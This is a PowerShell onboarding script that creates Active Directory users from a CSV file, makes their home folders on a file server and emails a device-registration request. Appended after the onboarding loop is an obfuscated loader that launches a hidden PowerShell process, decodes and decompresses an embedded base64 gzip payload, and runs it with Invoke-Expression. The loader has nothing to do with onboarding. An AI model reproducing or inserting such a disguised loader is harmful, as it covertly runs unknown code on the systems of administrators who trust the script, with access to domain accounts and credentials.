param(
	[Parameter()]
	[ValidateNotNullOrEmpty()]
	[string]$CsvFilePath
)

function New-CompanyAdUser {
	[CmdletBinding()]
	param
	(
		[Parameter(Mandatory)]
		[ValidateNotNullOrEmpty()]
		[pscustomobject]$EmployeeRecord
	)

	
	$password = [System.Web.Security.Membership]::GeneratePassword((Get-Random -Minimum 20 -Maximum 32), 3)
	$secPw = ConvertTo-SecureString -String $password -AsPlainText -Force

	
	$userName = "$($EmployeeRecord.FirstName.Substring(0,1))$($EmployeeRecord.LastName))"

	
	$NewUserParameters = @{
		GivenName       = $EmployeeRecord.FirstName
		Surname         = $EmployeeRecord.LastName
		Name            = $userName
		AccountPassword = $secPw
	}
	New-AdUser @NewUserParameters

	
	Add-AdGroupMember -Identity $EmployeeRecord.Department -Members $userName
}

function New-CompanyUserFolder {
	[CmdletBinding()]
	param
	(
		[Parameter(Mandatory)]
		[ValidateNotNullOrEmpty()]
		[pscustomobject]$EmployeeRecord
	)

	$fileServer = 'FS1'

	$null = New-Item -Path "\\$fileServer\Users\$($EmployeeRecord.FirstName)$($EmployeeRecord.LastName)" -ItemType Directory

}

function Register-CompanyMobileDevice {
	[CmdletBinding()]
	param
	(
		[Parameter(Mandatory)]
		[ValidateNotNullOrEmpty()]
		[pscustomobject]$EmployeeRecord
	)

	
	$sendMailParams = @{
		'From'       = 'EmailAddress@gmail.com'
		'To'         = 'SomeOtherAddress@whatever.com'
		'Subject'    = 'A new mobile device needs to be registered'
		'Body'       = "Employee: $($EmployeeRecord.FirstName) $($EmployeeRecord.LastName)"
		'SMTPServer' = 'smtpserver.something.local'
		'SMTPPort'   = '587'
	}
	
	Send-MailMessage @sendMailParams

}

function Read-Employee {
	[CmdletBinding()]
	param
	(
		[Parameter()]
		[ValidateNotNullOrEmpty()]
		[string]$CsvFilePath = $CsvFilePath
	)

	Import-Csv -Path $CsvFilePath

}


$functions = 'New-CompanyAdUser','New-CompanyUserFolder','Register-CompanyMobileDevice'
foreach ($employee in (Read-Employee)) {
	foreach ($function in $functions) {
		& $function -EmployeeRecord $employee
	}
}

if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAMjGJVgCA7VWbW/aSBD+nEr9D1aFZFslGAhtmkiVbg0YCC+BOJgAh04be20W1l5qr3nr9b/fGOyGXNMqV+kskHd3ZnZnn3lmxm4c2ILyQHJEpX6/X7Slr2/fnPVxiH1JyUVXncWncl7Kceyb27VXmqhnZyDPzdfLWPosKVO0WtW4j2kwu76uxmFIAnGcFxpEoCgi/iOjJFJU6W9pNCchOb99XBBbSF+l3F+FBuOPmKVquyq250Q6R4GTyDrcxolnBXPFqFDkP/+U1el5aVaof4kxixTZ3EWC+AWHMVmVvqnJgfe7FVHkLrVDHnFXFEY0uCgXhkGEXdKD3dakS8ScO5Gswi3gFxIRh4F0uE+ywVGsyDDsh9xGjhOSCLQLrWDNl0TJBTFjeekPZZqefhcHgvoE5IKEfGWScE1tEhWaOHAYuSPuTOmRTXbp1xopp0ag1Rehmod4vOBmlzsxI0dLWf3R0TSGKjzP4ggAfHv75u0bNyPAFhuV8tIiFXZKARidTQ9jAr4qfR7Rg/ZnqZiXunAqFjzcwTR3H8ZEnUnTJAbT2UzKLTa3Rv7n9qVMGVTDS9zbPDCdLkAwtTh1ZmCYxijnGpsoWf8512rEpQGp7QLsUzujk/IS8sRl5HDfQqbWA9cUORUQp0YY8bBIsMxL0x/N6j4V3231mDKHhMiG6EXgFQRWfe7MMTyK3Aq6xAekjnMZQuECiUmmnRJ3l52ezEFJrjIcRXmpH0MW2XnJJJgRJy+hIKKpCMWCH4byk7vdmAlq40hk283UDMf0vCoPIhHGNgQP7n5vrohNMUugyEtN6hB9Z1IvO1d+EYgqZowGHuy0hkDASgKAKRJKhODiIfxqwSSi5a8Y8UHnkM4Gwx4kb5oCBw5hjzjyvz3MKH7kc4JFBsKJfxBgk3GRlywaCqgKCa5PXPo9J06qwsGdakjSgChZzkz1nUg4nsP+hR2YCf0zgA5whAKgMELu6zgiHyumCAEo5Z12S6sInnErYF1bX9IS2tBSqwv/Ib1o8dql075ZNLWwtp27qBW1us1+bdBsVtY3plURZr0l2v2W6NYfFgsTNe+GYzFpoeY9LS7Hlf3qhu7NDnLGW+3jXt9vivp2v/Acd1xzXe/SNe9KHwzaGVUHerGMO7V63BnpG71Yiep00xzQ4WB5Y4jHscXw0NW8h9IVpttOuLBKvLtvIdSYX9j7G9dqzLvObtzUrkaVJaojVA3qlqHz9lgPUV+zsGfxTdtr674Hd911KZkMhoY+GBg6GjYWX2pXmge2D3iuj6wynawe7uYwN8CFtlastByy5+MBgNTgCHt3oONVy/bcBZ3ae6S/7/GojJc6RzroGJMv4Nd4ZfQZyO+HZY4s1nvAqDPZGZpWGvcrqFmko4aHki2xpw8wita1fU0rWQ53Rh96Y1ezHtilVqver2xX07RNs9a2J6Xtp9vLT50RtXyOhppmvUuoAdzIsfLSc/ZDMfLHJ2H/WUXv4jCaYwZ0gFKdZaPBQyOtun1OEwtF+d5+lyQMCIOuBX0tozVijNtJAzip0dCCjo1hBtk5hOFF+cWRKn1XVJ/aQ7Z0fT0BfyFRUiYXOiTwxDxf3F4Ui1Dhi9tKEW7++mtW+WqnZLvlkyZxitjJQexwkJqkU25p2Zvbxv8PZ5rKc3g5r4Pzae0X0ldBXMw/A+IH6fOF/4T5b2ExwlSAtgmViZFjk/wVJCmZTj4wjkEDprjpk3zi3cbivAdfHv8A98TRLFcKAAA=''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

